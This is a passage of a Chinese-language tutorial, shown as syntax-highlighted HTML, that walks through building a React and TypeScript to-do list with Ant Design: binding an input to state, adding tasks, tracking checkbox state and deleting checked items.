<span class=\"token operator\">&lt;</span>Row<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">24</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>ul<span class=\"token operator\">&gt;</span>\n            <span class=\"token punctuation\">{</span>\n              dataInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">,</span>index<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> \n                <span class=\"token operator\">&lt;</span>li key<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>index<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>Checkbox<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Checkbox<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">{</span>item<span class=\"token punctuation\">}</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n          <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>Row gutter<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>Button type<span class=\"token operator\">=</span><span class=\"token string\">\"primary\"</span><span class=\"token operator\">&gt;</span>删除<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Button<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> DemoApp<span class=\"token punctuation\">;</span>\n\n</code></pre></div><p>在Input标签的onChange属性的值时一个Lambda表达式，传递参数为e，通过<code>e.target.value</code>将修改后的输入框的值作为参数传递个函数<code>taskNameChanged</code>函数（React中触发事件的名称，需要写成onXxx形式，这个事件名称的首字母必须大写。而普通的html元素的事件则全是小写）。\n在<code>taskNameChanged</code>函数中，采用解构赋值的形式创建了一个新的对象，然后调用<code>setDataInfo</code>函数更新原来的<code>state</code>，当<code>state</code>中的<code>taskName</code>值变更后，因为<code>Input</code>的<code>value</code>元素绑定了这个<code>state</code>中的<code>taskName</code>属性，在<code>state</code>更新后，页面Dom元素局部更新，因此更新了<code>Input</code>中的值。\n此时只能在输入框内写入，点击添加按钮还没反应，多以后面需要为按钮添加点击事件的处理逻辑。</p>\n<h3>为添加按钮绑定事件</h3>\n<p>点击添加按钮后要在任务列表区显示新的任务列表。修改后的DemoApp.tsx文件内容如下：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">\"react\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Input<span class=\"token punctuation\">,</span> Button<span class=\"token punctuation\">,</span> Row<span class=\"token punctuation\">,</span> Col<span class=\"token punctuation\">,</span> Checkbox <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"antd\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">DemoApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> <span class=\"token punctuation\">[</span>dataInfo<span class=\"token punctuation\">,</span> setDataInfo<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> React<span class=\"token punctuation\">.</span><span class=\"token function\">useState</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    taskName<span class=\"token operator\">:</span> <span class=\"token string\">\"新任务名称\"</span><span class=\"token punctuation\">,</span>\n    taskList<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"编写React教程\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"吃饭\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"睡觉\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">taskNameChange</span><span class=\"token punctuation\">(</span>newTaskname<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> newStateInfo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>dataInfo <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    newStateInfo<span class=\"token punctuation\">.</span>taskName <span class=\"token operator\">=</span> newTaskname<span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setDataInfo</span><span class=\"token punctuation\">(</span>newStateInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">addNewTaskToList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> newStateInfo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>dataInfo <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    newStateInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>newStateInfo<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setDataInfo</span><span class=\"token punctuation\">(</span>newStateInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>h1 style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> textAlign<span class=\"token operator\">:</span> <span class=\"token string\">\"center\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>待办列表<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>hr<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>hr<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>Row align<span class=\"token operator\">=</span><span class=\"token string\">\"middle\"</span> gutter<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>任务标题<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">11</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** value属性与state对象中的taskName绑定 */</span><span class=\"token punctuation\">}</span>\n          <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 增加onChange事件处理 */</span><span class=\"token punctuation\">}</span>\n          <span class=\"token operator\">&lt;</span>Input\n            value<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>dataInfo<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span>\n            onChange<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token function\">taskNameChange</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\n          <span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Input<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 增加onClick事件处理 */</span><span class=\"token punctuation\">}</span>\n          <span class=\"token operator\">&lt;</span>Button type<span class=\"token operator\">=</span><span class=\"token string\">\"primary\"</span> onClick<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>addNewTaskToList<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n            添加\n          <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Button<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>Row<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">24</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>ul<span class=\"token operator\">&gt;</span>\n            <span class=\"token punctuation\">{</span>dataInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">(</span>\n              <span class=\"token operator\">&lt;</span>li key<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>index<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>Checkbox<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Checkbox<span class=\"token operator\">&gt;</span>\n                <span class=\"token punctuation\">{</span>item<span class=\"token punctuation\">}</span>\n              <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\n          <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>Row gutter<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>Button type<span class=\"token operator\">=</span><span class=\"token string\">\"primary\"</span><span class=\"token operator\">&gt;</span>删除<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Button<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> DemoApp<span class=\"token punctuation\">;</span>\n\n</code></pre></div><p>addNewTaskToList函数的基本逻辑时：解构赋值创建新的state对象，然后将taskName通过解构赋值的方式加入到state的taskList的数组中。这里添加Array对象等还可以采用Array对象的push函数。\n截至到目前，我们已经完成了任务添加的功能，只是还有一些的瑕疵：\n1、理论上，这个页面首次挂载的时候不应该有任务的列表，但是如果我直接修改定义state的taskList属性为空，如下代码所示：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">const</span> <span class=\"token punctuation\">[</span>dataInfo<span class=\"token punctuation\">,</span> setDataInfo<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> React<span class=\"token punctuation\">.</span><span class=\"token function\">useState</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  taskName<span class=\"token operator\">:</span> <span class=\"token string\">'新任务名称'</span><span class=\"token punctuation\">,</span>\n  taskList<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>则后续的添加代码编译不通过，会提示不能把string类型的数据赋值给never类型的数据。\n2、点击添加后，未能清空数控中的内容，每次都要手工清除，比较麻烦。\n3、点击添加按钮时，怎么知道用户当前选中了哪些任务呢？</p>\n<h3>改进后的todo list</h3>\n<ol>\n<li>定义state时指定state中各属性的数据类型</li>\n</ol>\n<p>相对于javascript来说，typescript是一种强类型的语言，因此在数据赋值等过程中，需要对相关数据类型进行校验，因此我们在定义state时，可以使用泛型的方式指定state对象的各属性值，修改state定义代码如下所示：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">const</span> <span class=\"token punctuation\">[</span>dataInfo<span class=\"token punctuation\">,</span> setDataInfo<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> React<span class=\"token punctuation\">.</span><span class=\"token generic-function\"><span class=\"token function\">useState</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">{</span>\n  taskName<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span>\n  taskList<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    taskName<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span>\n    checkedFlag<span class=\"token operator\">:</span> <span class=\"token builtin\">boolean</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  taskName<span class=\"token operator\">:</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span>\n  taskList<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>以上代码可以解释为<code>React.useState&lt;数据类型定义&gt;(初始化对象的定义)</code>。其中数据类型定义和初始化对象的定义都采用字面量的形式进行定义，都是“键-值”对的形式。类型定义对象中的值是类属性的数据类型，而初始化对象的值是类属性对应的数据值。\n这里<code>taskList</code>由原来的<code>string[]</code>类型变更成了<code>类[]</code>，增加了<code>checkedFlag</code>属性，目的是和任务列表中的<code>Checkbox</code>的<code>checked</code>属性对应，用来标识该项任务列表是否被中。由于列表数据类型发生了变化，因此循环显示任务列表的TSX代码也要做对应修改：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code>          <span class=\"token operator\">&lt;</span>ul<span class=\"token operator\">&gt;</span>\n            <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 将原来的静态内容修改为根据taskList内容输出列表 */</span><span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">{</span>dataInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">(</span>\n              <span class=\"token operator\">&lt;</span>li key<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>item<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>Checkbox<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Checkbox<span class=\"token operator\">&gt;</span>\n                <span class=\"token punctuation\">{</span>item<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span>\n              <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\n          <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">&gt;</span>\n</code></pre></div><p>同理，添加任务列表的逻辑也需要调整：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">function</span> <span class=\"token function\">addNewTaskToList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">let</span> newStateInfo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>dataInfo <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  newStateInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>taskName<span class=\"token operator\">:</span> newStateInfo<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">,</span> checkedFlag<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">setDataInfo</span><span class=\"token punctuation\">(</span>newStateInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>现在添加列表的不是一个string，而是要给对象了。</p>\n<ol start=\"2\">\n<li>添加任务后，清空输入框中的输入内容</li>\n</ol>\n<p>其实就是在<code>addNewTaskToList</code>函数的<code>setDataInfo</code>调用前，增加了清空<code>taskName</code>的属性值的代码。</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code>  <span class=\"token keyword\">function</span> <span class=\"token function\">addNewTaskToList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> newStateInfo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>dataInfo <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    newStateInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>taskName<span class=\"token operator\">:</span> newStateInfo<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">,</span> checkedFlag<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 添加任务后，清空输入框中的输入内容</span>\n    newStateInfo<span class=\"token punctuation\">.</span>taskName <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setDataInfo</span><span class=\"token punctuation\">(</span>newStateInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n</code></pre></div><ol start=\"3\">\n<li>添加Checkbox的onChange事件处理逻辑</li>\n</ol>\n<p>因为Checkbox的<code>checked</code>属性与任务列表中的<code>checkedFlag</code>属性绑定了，如果不添加<code>onChange</code>事件会出现和Input不绑定<code>onChange</code>事件的结果一样：无论你怎么点击Checkbox都不会处于选中状态。增加的Checkbox <code>onChange</code>事件处理逻辑如下：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> CheckboxChangeEvent <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'antd/es/checkbox'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">checkedOrNotchecked</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> CheckboxChangeEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">let</span> newStateInfo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token operator\">...</span>dataInfo<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  newStateInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span>item <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">.</span>taskName <span class=\"token operator\">===</span> e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n          <span class=\"token keyword\">return</span> item<span class=\"token punctuation\">.</span>checkedFlag <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>checked<span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n          <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">setDataInfo</span><span class=\"token punctuation\">(</span>newStateInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>逻辑的基本处理思路就是：遍历taskList数组，将对应的任务项的checkFlag值变更为当前Checkbox的状态。记得最后一定要更新state，否则不会触发Dom元素的重新渲染动作。</p>\n<ol start=\"4\">\n<li>添加删除按钮的点击事件处理逻辑</li>\n</ol>\n<p>因为任务列表不再是一个string，因此我们很容易通过遍历任务列表知道哪些待办任务被选中，从而删除选中的待办任务。删除函数处理逻辑如下：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token doc-comment comment\">/** 删除选中的待办任务 */</span>\n<span class=\"token keyword\">const</span> <span class=\"token function-variable function\">deleteCheckedTaskName</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">let</span> newStateInfo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token operator\">...</span>dataInfo<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  newStateInfo<span class=\"token punctuation\">.</span>taskList <span class=\"token operator\">=</span> newStateInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span>item <span class=\"token operator\">=&gt;</span> <span class=\"token operator\">!</span>item<span class=\"token punctuation\">.</span>checkedFlag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">setDataInfo</span><span class=\"token punctuation\">(</span>newStateInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>这里采用了定义一个Lambda表达式（也叫箭头函数）变量的形式定义了一个函数，和采用关键字function定义一个函数没有本质上的区别。删除的基本逻辑就是：变量taskList，过滤那些被选中的项。记得最后一定要更新state，否则不会触发Dom元素的重新渲染动作。\n完整代码</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">\"react\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Input<span class=\"token punctuation\">,</span> Button<span class=\"token punctuation\">,</span> Row<span class=\"token punctuation\">,</span> Col<span class=\"token punctuation\">,</span> Checkbox <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"antd\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> CheckboxChangeEvent <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"antd/es/checkbox\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">DemoApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  \n  <span class=\"token keyword\">const</span> <span class=\"token punctuation\">[</span>dataInfo<span class=\"token punctuation\">,</span> setDataInfo<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> React<span class=\"token punctuation\">.</span><span class=\"token generic-function\"><span class=\"token function\">useState</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">{</span>\n    taskName<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">;</span>\n    taskList<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      taskName<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">;</span>\n      checkedFlag<span class=\"token operator\">:</span> <span class=\"token builtin\">boolean</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    taskName<span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n    taskList<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">taskNameChange</span><span class=\"token punctuation\">(</span>newTaskname<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> newStateInfo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>dataInfo <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    newStateInfo<span class=\"token punctuation\">.</span>taskName <span class=\"token operator\">=</span> newTaskname<span class=\"token punctuation\">;</span>\n    <span 